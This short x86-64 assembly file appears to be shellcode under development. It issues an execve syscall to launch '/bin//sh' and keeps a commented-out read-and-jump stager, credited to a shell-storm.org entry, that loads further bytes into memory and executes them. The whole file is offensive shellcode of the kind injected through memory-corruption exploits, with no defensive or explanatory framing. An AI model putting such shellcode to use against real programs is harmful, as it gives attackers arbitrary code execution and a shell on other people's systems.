; nasm -felf64 test.s -o test.o
; ld test.o -o test
global _start

section .text

_start:
	; int execve(const char *filename, char *const argv[],char *const envp[])
	; mov rdi, 0x68732f2f6e69622f ; /bin//sh in reverse order
	add rsi, 0x11
	mov rdi, rsi
	xor rsi, rsi
	xor rdx, rdx
	mov al,	59			; execve syscall number
	syscall

; read:
; 	; http://shell-storm.org/shellcode/files/shellcode-824.php
; 	; ssize_t read(int fd, void *buf, size_t count);
; 	syscall
; 	mov dl, 0x7f
; 	mov rsi, rcx
; 	sub rsi, 50
; 	syscall
; 	jmp rsi
; 	ret